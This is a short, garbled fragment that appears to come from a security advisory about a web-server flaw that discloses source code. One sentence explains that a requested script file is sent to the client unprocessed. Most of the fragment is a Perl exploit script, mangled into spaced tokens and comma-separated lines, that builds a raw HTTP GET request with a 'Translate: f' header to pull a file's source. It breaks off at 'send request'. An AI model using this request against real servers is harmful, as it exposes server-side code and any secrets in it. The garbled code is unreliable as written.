The scripting engine will be able to locate the requested file , however , it will not recognize it as a file that needs to be processed and will proceed to send the file source to the client. ，  #  ! /usr/bin/perl ， use Socket ;  ， test arguments ， load values ，  $ host = @ ARGV [ 0 ]  ;  $ port = @ ARGV [ 2 ]  ;  $ target = inet_aton (  $ host )  ;  $ toget= @ ARGV [ 1 ]  ;  ， build request ，  $ xtosend=EOT ， GET / $ toget\\ HTTP/1.0 ， Host :  $ host ， User-Agent : SensePostData ， Content-Type : application/x-www-form-urlencoded ， Translate : f ， EOT ，  $ xtosend= ~ s/\\n/\\r\\n/g ;  ， send request",
